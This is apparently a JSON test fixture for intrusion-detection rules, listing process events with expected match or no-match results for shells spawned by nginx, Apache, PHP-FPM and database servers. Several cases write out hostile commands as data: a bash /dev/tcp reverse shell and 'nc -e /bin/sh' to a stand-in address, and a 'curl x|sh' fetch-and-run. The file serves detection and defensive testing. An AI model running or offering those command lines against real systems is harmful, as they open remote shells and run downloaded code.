[
{"rule":"alarm.web_server.shell","name":"nginx starts sh (dash)","event":{"process.name":"dash","process.exe":"/usr/bin/dash","process.cmdline":"sh -c id","parent.name":"nginx"},"expect":"match"},
{"rule":"alarm.web_server.shell","name":"apache (Fedora) starts bash","event":{"process.name":"bash","process.exe":"/usr/bin/bash","process.cmdline":"bash -c whoami","parent.name":"httpd"},"expect":"match"},
{"rule":"alarm.web_server.shell","name":"a php-fpm 8.3 worker starts sh","event":{"process.name":"dash","process.exe":"/usr/bin/dash","process.cmdline":"sh -c uname -a","parent.name":"php-fpm8.3"},"expect":"match"},
{"rule":"alarm.web_server.shell","name":"nginx starts a non-shell helper","event":{"process.name":"logrotate","process.exe":"/usr/sbin/logrotate","process.cmdline":"logrotate /etc/logrotate.conf","parent.name":"nginx"},"expect":"no_match"},
{"rule":"alarm.web_server.shell","name":"a healthcheck shell from the container runtime","event":{"process.name":"sh","process.exe":"/bin/sh","process.cmdline":"sh -c curl -fsS localhost/health","parent.name":"runc"},"expect":"no_match"},
{"rule":"alarm.web_server.shell","name":"an operator's shell (sshd parent)","event":{"process.name":"bash","process.exe":"/usr/bin/bash","process.cmdline":"-bash","parent.name":"sshd"},"expect":"no_match"},
{"rule":"alarm.web_server.shell","name":"no parent known","event":{"process.name":"sh","process.exe":"/bin/sh","process.cmdline":"sh -c id"},"expect":"unavailable"},
{"rule":"alarm.database.shell","name":"redis-server starts sh","event":{"process.name":"sh","process.exe":"/usr/bin/sh","process.cmdline":"sh -c curl x|sh","parent.name":"redis-server"},"expect":"match"},
{"rule":"alarm.database.shell","name":"mariadbd starts bash","event":{"process.name":"bash","process.exe":"/usr/bin/bash","process.cmdline":"bash -c id","parent.name":"mariadbd"},"expect":"match"},
{"rule":"alarm.database.shell","name":"postgres archive_command (excluded on purpose)","event":{"process.name":"sh","process.exe":"/usr/bin/sh","process.cmdline":"sh -c pgbackrest --stanza=main archive-push pg_wal/0001","parent.name":"postgres"},"expect":"no_match"},
{"rule":"alarm.database.shell","name":"mysqld starts its own helper, not a shell","event":{"process.name":"mysqld_safe","process.exe":"/usr/bin/mysqld_safe","process.cmdline":"mysqld_safe","parent.name":"mysqld"},"expect":"no_match"},
{"rule":"alarm.exec.dev_shm","name":"a binary run from /dev/shm","event":{"process.name":"x","process.exe":"/dev/shm/.x/x","process.cmdline":"./x"},"expect":"match"},
{"rule":"alarm.exec.dev_shm","name":"a binary run from /tmp is not this rule (too noisy on build hosts)","event":{"process.name":"build-script-build","process.exe":"/tmp/cargo-install/build-script-build","process.cmdline":"build-script-build"},"expect":"no_match"},
{"rule":"alarm.exec.dev_shm","name":"a normal program","event":{"process.name":"ls","process.exe":"/usr/bin/ls","process.cmdline":"ls -l /dev/shm"},"expect":"no_match"},
{"rule":"alarm.shell.dev_tcp","name":"sh -c with a bash reverse shell","event":{"process.name":"dash","process.exe":"/usr/bin/dash","process.cmdline":"sh -c bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"},"expect":"match"},
{"rule":"alarm.shell.dev_tcp","name":"/dev/udp too","event":{"process.name":"bash","process.exe":"/usr/bin/bash","process.cmdline":"bash -c exec 3<>/dev/udp/203.0.113.7/53"},"expect":"match"},
{"rule":"alarm.shell.dev_tcp","name":"a script that only mentions tcp","event":{"process.name":"bash","process.exe":"/usr/bin/bash","process.cmdline":"bash /usr/local/bin/check-tcp-port.sh 443"},"expect":"no_match"},
{"rule":"alarm.netcat.exec","name":"nc -e /bin/sh","event":{"process.name":"nc.traditional","process.exe":"/usr/bin/nc.traditional","process.cmdline":"nc 203.0.113.7 4444 -e /bin/sh"},"expect":"match"},
{"rule":"alarm.netcat.exec","name":"ncat --sh-exec","event":{"process.name":"ncat","process.exe":"/usr/bin/ncat","process.cmdline":"ncat -l 4444 --sh-exec cat"},"expect":"match"},
{"rule":"alarm.netcat.exec","name":"nc.openbsd -c is TLS, not exec","event":{"process.name":"nc.openbsd","process.exe":"/usr/bin/nc.openbsd","process.cmdline":"nc -c example.org 443"},"expect":"no_match"},
{"rule":"alarm.netcat.exec","name":"a plain port probe","event":{"process.name":"nc","process.exe":"/usr/bin/nc","process.cmdline":"nc -zv 192.0.2.1 22"},"expect":"no_match"}
]
